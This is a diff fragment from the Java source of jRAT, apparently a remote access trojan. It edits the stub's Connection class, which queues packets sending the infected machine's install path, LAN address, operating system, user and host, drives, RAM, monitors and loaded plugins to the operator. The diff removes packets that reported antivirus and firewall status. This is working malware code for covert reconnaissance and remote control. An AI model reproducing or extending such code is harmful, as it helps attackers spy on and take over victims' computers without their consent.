@@ -19,7 +19,6 @@ import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
 import se.jrat.common.ConnectionCodes;
-import se.jrat.common.Version;
 import se.jrat.common.crypto.Crypto;
 import se.jrat.common.crypto.CryptoUtils;
 import se.jrat.common.crypto.KeyExchanger;
@@ -28,25 +27,23 @@ import se.jrat.stub.packets.incoming.AbstractIncomingPacket;
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet10InitDefaultLocale;
 import se.jrat.stub.packets.outgoing.Packet13Status;
-import se.jrat.stub.packets.outgoing.Packet7InitServerID;
-import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
 import se.jrat.stub.packets.outgoing.Packet23InitInstallPath;
 import se.jrat.stub.packets.outgoing.Packet25InitJavaVersion;
 import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
 import se.jrat.stub.packets.outgoing.Packet28InitLanAddress;
-import se.jrat.stub.packets.outgoing.Packet6InitVersion;
 import se.jrat.stub.packets.outgoing.Packet31InitInstallationDate;
 import se.jrat.stub.packets.outgoing.Packet36Initialized;
-import se.jrat.stub.packets.outgoing.Packet8InitCountry;
+import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
 import se.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import se.jrat.stub.packets.outgoing.Packet62InitDrives;
 import se.jrat.stub.packets.outgoing.Packet63InitRAM;
 import se.jrat.stub.packets.outgoing.Packet64InitAvailableCores;
 import se.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
-import se.jrat.stub.packets.outgoing.Packet69InitAntivirus;
-import se.jrat.stub.packets.outgoing.Packet70InitFirewall;
+import se.jrat.stub.packets.outgoing.Packet6InitVersion;
+import se.jrat.stub.packets.outgoing.Packet7InitServerID;
+import se.jrat.stub.packets.outgoing.Packet8InitCountry;
 
 import com.sun.management.OperatingSystemMXBean;
 
@@ -183,10 +180,6 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet64InitAvailableCores(Runtime.getRuntime().availableProcessors()));
 
 		addToSendQueue(new Packet61InitMonitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));
-
-		addToSendQueue(new Packet69InitAntivirus());
-
-		addToSendQueue(new Packet70InitFirewall());
 		
 		addToSendQueue(new Packet67LoadedPlugins()); // TODO
 		
